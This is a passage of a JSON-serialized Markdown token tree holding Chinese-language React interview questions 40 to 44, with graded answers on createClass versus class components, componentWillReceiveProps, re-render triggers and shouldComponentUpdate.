object)，描述了对于一个DOM节点或者其他组件component，你想让它在屏幕上呈现成什么样子。元素element可以在它的属性props中包含其他元素(译注:用于形成元素树)。创建一个React元素element成本很低。元素element创建之后是不可变的。\\n","tokens":[{"type":"text","raw":"元素： 一个元素element是一个普通对象(plain object)，描述了对于一个DOM节点或者其他组件component，你想让它在屏幕上呈现成什么样子。元素element可以在它的属性props中包含其他元素(译注:用于形成元素树)。创建一个React元素element成本很低。元素element创建之后是不可变的。\\n","text":"元素： 一个元素element是一个普通对象(plain object)，描述了对于一个DOM节点或者其他组件component，你想让它在屏幕上呈现成什么样子。元素element可以在它的属性props中包含其他元素(译注:用于形成元素树)。创建一个React元素element成本很低。元素element创建之后是不可变的。","tokens":[{"type":"text","raw":"元素： 一个元素element是一个普通对象(plain object)，描述了对于一个DOM节点或者其他组件component，你想让它在屏幕上呈现成什么样子。元素element可以在它的属性props中包含其他元素(译注:用于形成元素树)。创建一个React元素element成本很低。元素element创建之后是不可变的。","text":"元素： 一个元素element是一个普通对象(plain object)，描述了对于一个DOM节点或者其他组件component，你想让它在屏幕上呈现成什么样子。元素element可以在它的属性props中包含其他元素(译注:用于形成元素树)。创建一个React元素element成本很低。元素element创建之后是不可变的。","escaped":false}]}]},{"type":"list_item","raw":"- 组件： 一个组件component可以通过多种方式声明。可以是带有一个render()方法的类，简单点也可以定义为一个函数。这两种情况下，它都把属性props作为输入，把返回的一棵元素树作为输出。\\n\\n","task":false,"loose":true,"text":"组件： 一个组件component可以通过多种方式声明。可以是带有一个render()方法的类，简单点也可以定义为一个函数。这两种情况下，它都把属性props作为输入，把返回的一棵元素树作为输出。\\n","tokens":[{"type":"text","raw":"组件： 一个组件component可以通过多种方式声明。可以是带有一个render()方法的类，简单点也可以定义为一个函数。这两种情况下，它都把属性props作为输入，把返回的一棵元素树作为输出。\\n","text":"组件： 一个组件component可以通过多种方式声明。可以是带有一个render()方法的类，简单点也可以定义为一个函数。这两种情况下，它都把属性props作为输入，把返回的一棵元素树作为输出。","tokens":[{"type":"text","raw":"组件： 一个组件component可以通过多种方式声明。可以是带有一个render()方法的类，简单点也可以定义为一个函数。这两种情况下，它都把属性props作为输入，把返回的一棵元素树作为输出。","text":"组件： 一个组件component可以通过多种方式声明。可以是带有一个render()方法的类，简单点也可以定义为一个函数。这两种情况下，它都把属性props作为输入，把返回的一棵元素树作为输出。","escaped":false}]}]},{"type":"list_item","raw":"- 实例： 一个实例instance是你在所写的组件类component class中使用关键字this所指向的东西(译注:组件实例)。它用来存储本地状态和响应生命周期事件很有用。","task":false,"loose":true,"text":"实例： 一个实例instance是你在所写的组件类component class中使用关键字this所指向的东西(译注:组件实例)。它用来存储本地状态和响应生命周期事件很有用。","tokens":[{"type":"text","raw":"实例： 一个实例instance是你在所写的组件类component class中使用关键字this所指向的东西(译注:组件实例)。它用来存储本地状态和响应生命周期事件很有用。","text":"实例： 一个实例instance是你在所写的组件类component class中使用关键字this所指向的东西(译注:组件实例)。它用来存储本地状态和响应生命周期事件很有用。","tokens":[{"type":"text","raw":"实例： 一个实例instance是你在所写的组件类component class中使用关键字this所指向的东西(译注:组件实例)。它用来存储本地状态和响应生命周期事件很有用。","text":"实例： 一个实例instance是你在所写的组件类component class中使用关键字this所指向的东西(译注:组件实例)。它用来存储本地状态和响应生命周期事件很有用。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"函数式组件(Functional component)根本没有实例instance。类组件(Class component)有实例instance，但是永远也不需要直接创建一个组件的实例，因为React帮我们做了这些。","text":"函数式组件(Functional component)根本没有实例instance。类组件(Class component)有实例instance，但是永远也不需要直接创建一个组件的实例，因为React帮我们做了这些。","tokens":[{"type":"text","raw":"函数式组件(Functional component)根本没有实例instance。类组件(Class component)有实例instance，但是永远也不需要直接创建一个组件的实例，因为React帮我们做了这些。","text":"函数式组件(Functional component)根本没有实例instance。类组件(Class component)有实例instance，但是永远也不需要直接创建一个组件的实例，因为React帮我们做了这些。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 40. React.createClass和extends Component的区别有哪些？\\n\\n","depth":2,"text":"40. React.createClass和extends Component的区别有哪些？","tokens":[{"type":"text","raw":"40. React.createClass和extends Component的区别有哪些？","text":"40. React.createClass和extends Component的区别有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"语法区别","text":"语法区别","tokens":[{"type":"text","raw":"语法区别","text":"语法区别","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- createClass本质上是一个工厂函数，extends的方式更加接近最新的ES6规范的class写法。两种方式在语法上的差别主要体现在方法的定义和静态属性的声明上。\\n\\n- createClass方式的方法定义使用逗号，隔开，因为creatClass本质上是一个函数，传递给它的是一个Object；而class的方式定义方法时务必谨记不要使用逗号隔开，这是ES6 class的语法规范。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- createClass本质上是一个工厂函数，extends的方式更加接近最新的ES6规范的class写法。两种方式在语法上的差别主要体现在方法的定义和静态属性的声明上。\\n\\n","task":false,"loose":true,"text":"createClass本质上是一个工厂函数，extends的方式更加接近最新的ES6规范的class写法。两种方式在语法上的差别主要体现在方法的定义和静态属性的声明上。\\n","tokens":[{"type":"text","raw":"createClass本质上是一个工厂函数，extends的方式更加接近最新的ES6规范的class写法。两种方式在语法上的差别主要体现在方法的定义和静态属性的声明上。\\n","text":"createClass本质上是一个工厂函数，extends的方式更加接近最新的ES6规范的class写法。两种方式在语法上的差别主要体现在方法的定义和静态属性的声明上。","tokens":[{"type":"text","raw":"createClass本质上是一个工厂函数，extends的方式更加接近最新的ES6规范的class写法。两种方式在语法上的差别主要体现在方法的定义和静态属性的声明上。","text":"createClass本质上是一个工厂函数，extends的方式更加接近最新的ES6规范的class写法。两种方式在语法上的差别主要体现在方法的定义和静态属性的声明上。","escaped":false}]}]},{"type":"list_item","raw":"- createClass方式的方法定义使用逗号，隔开，因为creatClass本质上是一个函数，传递给它的是一个Object；而class的方式定义方法时务必谨记不要使用逗号隔开，这是ES6 class的语法规范。","task":false,"loose":true,"text":"createClass方式的方法定义使用逗号，隔开，因为creatClass本质上是一个函数，传递给它的是一个Object；而class的方式定义方法时务必谨记不要使用逗号隔开，这是ES6 class的语法规范。","tokens":[{"type":"text","raw":"createClass方式的方法定义使用逗号，隔开，因为creatClass本质上是一个函数，传递给它的是一个Object；而class的方式定义方法时务必谨记不要使用逗号隔开，这是ES6 class的语法规范。","text":"createClass方式的方法定义使用逗号，隔开，因为creatClass本质上是一个函数，传递给它的是一个Object；而class的方式定义方法时务必谨记不要使用逗号隔开，这是ES6 class的语法规范。","tokens":[{"type":"text","raw":"createClass方式的方法定义使用逗号，隔开，因为creatClass本质上是一个函数，传递给它的是一个Object；而class的方式定义方法时务必谨记不要使用逗号隔开，这是ES6 class的语法规范。","text":"createClass方式的方法定义使用逗号，隔开，因为creatClass本质上是一个函数，传递给它的是一个Object；而class的方式定义方法时务必谨记不要使用逗号隔开，这是ES6 class的语法规范。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"propType 和 getDefaultProps","text":"propType 和 getDefaultProps","tokens":[{"type":"text","raw":"propType 和 getDefaultProps","text":"propType 和 getDefaultProps","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- React.createClass：通过proTypes对象和getDefaultProps()方法来设置和获取props.\\n\\n- React.Component：通过设置两个属性propTypes和defaultProps","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- React.createClass：通过proTypes对象和getDefaultProps()方法来设置和获取props.\\n\\n","task":false,"loose":true,"text":"React.createClass：通过proTypes对象和getDefaultProps()方法来设置和获取props.\\n","tokens":[{"type":"text","raw":"React.createClass：通过proTypes对象和getDefaultProps()方法来设置和获取props.\\n","text":"React.createClass：通过proTypes对象和getDefaultProps()方法来设置和获取props.","tokens":[{"type":"text","raw":"React.createClass：通过proTypes对象和getDefaultProps()方法来设置和获取props.","text":"React.createClass：通过proTypes对象和getDefaultProps()方法来设置和获取props.","escaped":false}]}]},{"type":"list_item","raw":"- React.Component：通过设置两个属性propTypes和defaultProps","task":false,"loose":true,"text":"React.Component：通过设置两个属性propTypes和defaultProps","tokens":[{"type":"text","raw":"React.Component：通过设置两个属性propTypes和defaultProps","text":"React.Component：通过设置两个属性propTypes和defaultProps","tokens":[{"type":"text","raw":"React.Component：通过设置两个属性propTypes和defaultProps","text":"React.Component：通过设置两个属性propTypes和defaultProps","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"状态的区别","text":"状态的区别","tokens":[{"type":"text","raw":"状态的区别","text":"状态的区别","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- React.createClass：通过getInitialState()方法返回一个包含初始值的对象\\n\\n- React.Component：通过constructor构造函数设置初始状态","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- React.createClass：通过getInitialState()方法返回一个包含初始值的对象\\n\\n","task":false,"loose":true,"text":"React.createClass：通过getInitialState()方法返回一个包含初始值的对象\\n","tokens":[{"type":"text","raw":"React.createClass：通过getInitialState()方法返回一个包含初始值的对象\\n","text":"React.createClass：通过getInitialState()方法返回一个包含初始值的对象","tokens":[{"type":"text","raw":"React.createClass：通过getInitialState()方法返回一个包含初始值的对象","text":"React.createClass：通过getInitialState()方法返回一个包含初始值的对象","escaped":false}]}]},{"type":"list_item","raw":"- React.Component：通过constructor构造函数设置初始状态","task":false,"loose":true,"text":"React.Component：通过constructor构造函数设置初始状态","tokens":[{"type":"text","raw":"React.Component：通过constructor构造函数设置初始状态","text":"React.Component：通过constructor构造函数设置初始状态","tokens":[{"type":"text","raw":"React.Component：通过constructor构造函数设置初始状态","text":"React.Component：通过constructor构造函数设置初始状态","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"this.state","text":"this.state","tokens":[{"type":"text","raw":"this.state","text":"this.state","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- React.createClass：需要显示的调用this.setState()方法\\n\\n- React.Component：不需要调用，直接this.state获取","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- React.createClass：需要显示的调用this.setState()方法\\n\\n","task":false,"loose":true,"text":"React.createClass：需要显示的调用this.setState()方法\\n","tokens":[{"type":"text","raw":"React.createClass：需要显示的调用this.setState()方法\\n","text":"React.createClass：需要显示的调用this.setState()方法","tokens":[{"type":"text","raw":"React.createClass：需要显示的调用this.setState()方法","text":"React.createClass：需要显示的调用this.setState()方法","escaped":false}]}]},{"type":"list_item","raw":"- React.Component：不需要调用，直接this.state获取","task":false,"loose":true,"text":"React.Component：不需要调用，直接this.state获取","tokens":[{"type":"text","raw":"React.Component：不需要调用，直接this.state获取","text":"React.Component：不需要调用，直接this.state获取","tokens":[{"type":"text","raw":"React.Component：不需要调用，直接this.state获取","text":"React.Component：不需要调用，直接this.state获取","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Mixins","text":"Mixins","tokens":[{"type":"text","raw":"Mixins","text":"Mixins","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- React.createClass：通过mixins属性混合进来\\n\\n- React.Component：通过引入React Mixin","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- React.createClass：通过mixins属性混合进来\\n\\n","task":false,"loose":true,"text":"React.createClass：通过mixins属性混合进来\\n","tokens":[{"type":"text","raw":"React.createClass：通过mixins属性混合进来\\n","text":"React.createClass：通过mixins属性混合进来","tokens":[{"type":"text","raw":"React.createClass：通过mixins属性混合进来","text":"React.createClass：通过mixins属性混合进来","escaped":false}]}]},{"type":"list_item","raw":"- React.Component：通过引入React Mixin","task":false,"loose":true,"text":"React.Component：通过引入React Mixin","tokens":[{"type":"text","raw":"React.Component：通过引入React Mixin","text":"React.Component：通过引入React Mixin","tokens":[{"type":"text","raw":"React.Component：通过引入React Mixin","text":"React.Component：通过引入React Mixin","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 41. 对componentWillReceiveProps 的理解\\n\\n","depth":2,"text":"41. 对componentWillReceiveProps 的理解","tokens":[{"type":"text","raw":"41. 对componentWillReceiveProps 的理解","text":"41. 对componentWillReceiveProps 的理解","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"该方法当props发生变化时执行，初始化render时不执行，在这个回调函数里面，你可以根据属性的变化，通过调用this.setState()来更新你的组件状态，旧的属性还是可以通过this.props来获取,这里调用更新状态是安全的，并不会触发额外的render调用。","text":"该方法当props发生变化时执行，初始化render时不执行，在这个回调函数里面，你可以根据属性的变化，通过调用this.setState()来更新你的组件状态，旧的属性还是可以通过this.props来获取,这里调用更新状态是安全的，并不会触发额外的render调用。","tokens":[{"type":"text","raw":"该方法当props发生变化时执行，初始化render时不执行，在这个回调函数里面，你可以根据属性的变化，通过调用this.setState()来更新你的组件状态，旧的属性还是可以通过this.props来获取,这里调用更新状态是安全的，并不会触发额外的render调用。","text":"该方法当props发生变化时执行，初始化render时不执行，在这个回调函数里面，你可以根据属性的变化，通过调用this.setState()来更新你的组件状态，旧的属性还是可以通过this.props来获取,这里调用更新状态是安全的，并不会触发额外的render调用。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"使用好处： 在这个生命周期中，可以在子组件的render函数执行前获取新的props，从而更新子组件自己的state。 可以将数据请求放在这里进行执行，需要传的参数则从componentWillReceiveProps(nextProps)中获取。而不必将所有的请求都放在父组件中。于是该请求只会在该组件渲染时才会发出，从而减轻请求负担。","text":"使用好处： 在这个生命周期中，可以在子组件的render函数执行前获取新的props，从而更新子组件自己的state。 可以将数据请求放在这里进行执行，需要传的参数则从componentWillReceiveProps(nextProps)中获取。而不必将所有的请求都放在父组件中。于是该请求只会在该组件渲染时才会发出，从而减轻请求负担。","tokens":[{"type":"text","raw":"使用好处： 在这个生命周期中，可以在子组件的render函数执行前获取新的props，从而更新子组件自己的state。 可以将数据请求放在这里进行执行，需要传的参数则从componentWillReceiveProps(nextProps)中获取。而不必将所有的请求都放在父组件中。于是该请求只会在该组件渲染时才会发出，从而减轻请求负担。","text":"使用好处： 在这个生命周期中，可以在子组件的render函数执行前获取新的props，从而更新子组件自己的state。 可以将数据请求放在这里进行执行，需要传的参数则从componentWillReceiveProps(nextProps)中获取。而不必将所有的请求都放在父组件中。于是该请求只会在该组件渲染时才会发出，从而减轻请求负担。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"componentWillReceiveProps在初始化render的时候不会执行，它会在Component接受到新的状态(Props)时被触发，一般用于父组件状态更新时子组件的重新渲染。","text":"componentWillReceiveProps在初始化render的时候不会执行，它会在Component接受到新的状态(Props)时被触发，一般用于父组件状态更新时子组件的重新渲染。","tokens":[{"type":"text","raw":"componentWillReceiveProps在初始化render的时候不会执行，它会在Component接受到新的状态(Props)时被触发，一般用于父组件状态更新时子组件的重新渲染。","text":"componentWillReceiveProps在初始化render的时候不会执行，它会在Component接受到新的状态(Props)时被触发，一般用于父组件状态更新时子组件的重新渲染。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 42. 哪些方法会触发 React 重新渲染？重新渲染 render 会做些什么？\\n\\n","depth":2,"text":"42. 哪些方法会触发 React 重新渲染？重新渲染 render 会做些什么？","tokens":[{"type":"text","raw":"42. 哪些方法会触发 React 重新渲染？重新渲染 render 会做些什么？","text":"42. 哪些方法会触发 React 重新渲染？重新渲染 render 会做些什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"（1）哪些方法会触发 react 重新渲染?","text":"（1）哪些方法会触发 react 重新渲染?","tokens":[{"type":"text","raw":"（1）哪些方法会触发 react 重新渲染?","text":"（1）哪些方法会触发 react 重新渲染?","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- setState（）方法被调用","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- setState（）方法被调用","task":false,"loose":false,"text":"setState（）方法被调用","tokens":[{"type":"text","raw":"setState（）方法被调用","text":"setState（）方法被调用","tokens":[{"type":"text","raw":"setState（）方法被调用","text":"setState（）方法被调用","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"setState 是 React 中最常用的命令，通常情况下，执行 setState 会触发 render。但是这里有个点值得关注，执行 setState 的时候不一定会重新渲染。当 setState 传入 null 时，并不会触发 render。","text":"setState 是 React 中最常用的命令，通常情况下，执行 setState 会触发 render。但是这里有个点值得关注，执行 setState 的时候不一定会重新渲染。当 setState 传入 null 时，并不会触发 render。","tokens":[{"type":"text","raw":"setState 是 React 中最常用的命令，通常情况下，执行 setState 会触发 render。但是这里有个点值得关注，执行 setState 的时候不一定会重新渲染。当 setState 传入 null 时，并不会触发 render。","text":"setState 是 React 中最常用的命令，通常情况下，执行 setState 会触发 render。但是这里有个点值得关注，执行 setState 的时候不一定会重新渲染。当 setState 传入 null 时，并不会触发 render。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 父组件重新渲染","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 父组件重新渲染","task":false,"loose":false,"text":"父组件重新渲染","tokens":[{"type":"text","raw":"父组件重新渲染","text":"父组件重新渲染","tokens":[{"type":"text","raw":"父组件重新渲染","text":"父组件重新渲染","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"只要父组件重新渲染了，其子组件都有可能重新渲染，因为父组件重新渲染了之后，所有子组件都会重新走一遍生命周期，这个时候只要子组件的 shouldComponentUpdate 或者 pureComponent 返回了 true，都会触发子组件的重新渲染。","text":"只要父组件重新渲染了，其子组件都有可能重新渲染，因为父组件重新渲染了之后，所有子组件都会重新走一遍生命周期，这个时候只要子组件的 shouldComponentUpdate 或者 pureComponent 返回了 true，都会触发子组件的重新渲染。","tokens":[{"type":"text","raw":"只要父组件重新渲染了，其子组件都有可能重新渲染，因为父组件重新渲染了之后，所有子组件都会重新走一遍生命周期，这个时候只要子组件的 shouldComponentUpdate 或者 pureComponent 返回了 true，都会触发子组件的重新渲染。","text":"只要父组件重新渲染了，其子组件都有可能重新渲染，因为父组件重新渲染了之后，所有子组件都会重新走一遍生命周期，这个时候只要子组件的 shouldComponentUpdate 或者 pureComponent 返回了 true，都会触发子组件的重新渲染。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"（2）重新渲染 render 会做些什么?","text":"（2）重新渲染 render 会做些什么?","tokens":[{"type":"text","raw":"（2）重新渲染 render 会做些什么?","text":"（2）重新渲染 render 会做些什么?","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 会对新旧 VNode 进行对比，也就是我们所说的Diff算法。\\n\\n- 对新旧两棵树进行一个深度优先遍历，这样每一个节点都会一个标记，在到深度遍历的时候，每遍历到一和个节点，就把该节点和新的节点树进行对比，如果有差异就放到一个对象里面\\n\\n- 遍历差异对象，根据差异的类型，根据对应对规则更新VNode","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 会对新旧 VNode 进行对比，也就是我们所说的Diff算法。\\n\\n","task":false,"loose":true,"text":"会对新旧 VNode 进行对比，也就是我们所说的Diff算法。\\n","tokens":[{"type":"text","raw":"会对新旧 VNode 进行对比，也就是我们所说的Diff算法。\\n","text":"会对新旧 VNode 进行对比，也就是我们所说的Diff算法。","tokens":[{"type":"text","raw":"会对新旧 VNode 进行对比，也就是我们所说的Diff算法。","text":"会对新旧 VNode 进行对比，也就是我们所说的Diff算法。","escaped":false}]}]},{"type":"list_item","raw":"- 对新旧两棵树进行一个深度优先遍历，这样每一个节点都会一个标记，在到深度遍历的时候，每遍历到一和个节点，就把该节点和新的节点树进行对比，如果有差异就放到一个对象里面\\n\\n","task":false,"loose":true,"text":"对新旧两棵树进行一个深度优先遍历，这样每一个节点都会一个标记，在到深度遍历的时候，每遍历到一和个节点，就把该节点和新的节点树进行对比，如果有差异就放到一个对象里面\\n","tokens":[{"type":"text","raw":"对新旧两棵树进行一个深度优先遍历，这样每一个节点都会一个标记，在到深度遍历的时候，每遍历到一和个节点，就把该节点和新的节点树进行对比，如果有差异就放到一个对象里面\\n","text":"对新旧两棵树进行一个深度优先遍历，这样每一个节点都会一个标记，在到深度遍历的时候，每遍历到一和个节点，就把该节点和新的节点树进行对比，如果有差异就放到一个对象里面","tokens":[{"type":"text","raw":"对新旧两棵树进行一个深度优先遍历，这样每一个节点都会一个标记，在到深度遍历的时候，每遍历到一和个节点，就把该节点和新的节点树进行对比，如果有差异就放到一个对象里面","text":"对新旧两棵树进行一个深度优先遍历，这样每一个节点都会一个标记，在到深度遍历的时候，每遍历到一和个节点，就把该节点和新的节点树进行对比，如果有差异就放到一个对象里面","escaped":false}]}]},{"type":"list_item","raw":"- 遍历差异对象，根据差异的类型，根据对应对规则更新VNode","task":false,"loose":true,"text":"遍历差异对象，根据差异的类型，根据对应对规则更新VNode","tokens":[{"type":"text","raw":"遍历差异对象，根据差异的类型，根据对应对规则更新VNode","text":"遍历差异对象，根据差异的类型，根据对应对规则更新VNode","tokens":[{"type":"text","raw":"遍历差异对象，根据差异的类型，根据对应对规则更新VNode","text":"遍历差异对象，根据差异的类型，根据对应对规则更新VNode","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 43. React如何判断什么时候重新渲染组件？\\n\\n","depth":2,"text":"43. React如何判断什么时候重新渲染组件？","tokens":[{"type":"text","raw":"43. React如何判断什么时候重新渲染组件？","text":"43. React如何判断什么时候重新渲染组件？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"组件状态的改变可以因为props的改变，或者直接通过setState方法改变。组件获得新的状态，然后React决定是否应该重新渲染组件。只要组件的state发生变化，React就会对组件进行重新渲染。这是因为React中的shouldComponentUpdate方法默认返回true，这就是导致每次更新都重新渲染的原因。","text":"组件状态的改变可以因为props的改变，或者直接通过setState方法改变。组件获得新的状态，然后React决定是否应该重新渲染组件。只要组件的state发生变化，React就会对组件进行重新渲染。这是因为React中的shouldComponentUpdate方法默认返回true，这就是导致每次更新都重新渲染的原因。","tokens":[{"type":"text","raw":"组件状态的改变可以因为props的改变，或者直接通过setState方法改变。组件获得新的状态，然后React决定是否应该重新渲染组件。只要组件的state发生变化，React就会对组件进行重新渲染。这是因为React中的shouldComponentUpdate方法默认返回true，这就是导致每次更新都重新渲染的原因。","text":"组件状态的改变可以因为props的改变，或者直接通过setState方法改变。组件获得新的状态，然后React决定是否应该重新渲染组件。只要组件的state发生变化，React就会对组件进行重新渲染。这是因为React中的shouldComponentUpdate方法默认返回true，这就是导致每次更新都重新渲染的原因。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"当React将要渲染组件时会执行shouldComponentUpdate方法来看它是否返回true（组件应该更新，也就是重新渲染）。所以需要重写shouldComponentUpdate方法让它根据情况返回true或者false来告诉React什么时候重新渲染什么时候跳过重新渲染。","text":"当React将要渲染组件时会执行shouldComponentUpdate方法来看它是否返回true（组件应该更新，也就是重新渲染）。所以需要重写shouldComponentUpdate方法让它根据情况返回true或者false来告诉React什么时候重新渲染什么时候跳过重新渲染。","tokens":[{"type":"text","raw":"当React将要渲染组件时会执行shouldComponentUpdate方法来看它是否返回true（组件应该更新，也就是重新渲染）。所以需要重写shouldComponentUpdate方法让它根据情况返回true或者false来告诉React什么时候重新渲染什么时候跳过重新渲染。","text":"当React将要渲染组件时会执行shouldComponentUpdate方法来看它是否返回true（组件应该更新，也就是重新渲染）。所以需要重写shouldComponentUpdate方法让它根据情况返回true或者false来告诉React什么时候重新渲染什么时候跳过重新渲染。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 44. 在React中如何避免不必要的render？\\n\\n","depth":2,"text":"44. 在React中如何避免不必要的render？","tokens":[{"type":"text","raw":"44. 在React中如何避免不必要的render？","text":"44. 在React中如何避免不必要的render？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 